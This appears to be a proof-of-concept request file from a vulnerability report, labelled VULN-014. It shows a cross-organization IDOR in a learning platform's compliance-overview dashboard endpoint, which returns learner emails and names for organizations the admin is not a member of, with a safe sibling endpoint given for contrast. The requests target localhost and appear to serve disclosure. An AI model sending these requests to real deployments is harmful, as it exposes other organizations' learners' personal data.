@@ -1,0 +1,22 @@
+### VULN-014 — Dashboard compliance-overview cross-org PII IDOR
+### Admin is a member of ONLY org 48bbdff8 (CVE Hunt Academy). Session cookie omitted for brevity.
+
+### [1] Read OUR OWN org — endpoint returns learner emails (PII).
+GET http://localhost:21527/dash/compliance-overview?orgId=48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Cookie: classroomio.session_token=<ADMIN_SESSION>
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+### -> HTTP 200 { data: { summary:{totalLearners:1,...}, learners:[{ email:"u_...@cvehunt.local", fullname, status, ... }] } }
+
+### [2] IDOR: query a DIFFERENT org (we are NOT a member) — header stays OUR org.
+GET http://localhost:21527/dash/compliance-overview?orgId=f0259e1a-b93d-4f0a-ae75-1939a177e583
+Cookie: classroomio.session_token=<ADMIN_SESSION>
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+### -> HTTP 200 (NOT 403) scoped to org f0259e1a (our seeded learner absent) — the query orgId
+###    selects the data; a non-member org is served. Against a populated victim org this returns
+###    that org's learner emails/names.
+
+### [contrast] The SAFE sibling handler ignores the query orgId (uses c.get('orgId')).
+GET http://localhost:21527/dash/top-courses?orgId=f0259e1a-b93d-4f0a-ae75-1939a177e583&days=30
+Cookie: classroomio.session_token=<ADMIN_SESSION>
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+### -> HTTP 200 scoped to OUR org (stats.ts:128 uses the authorized header org).
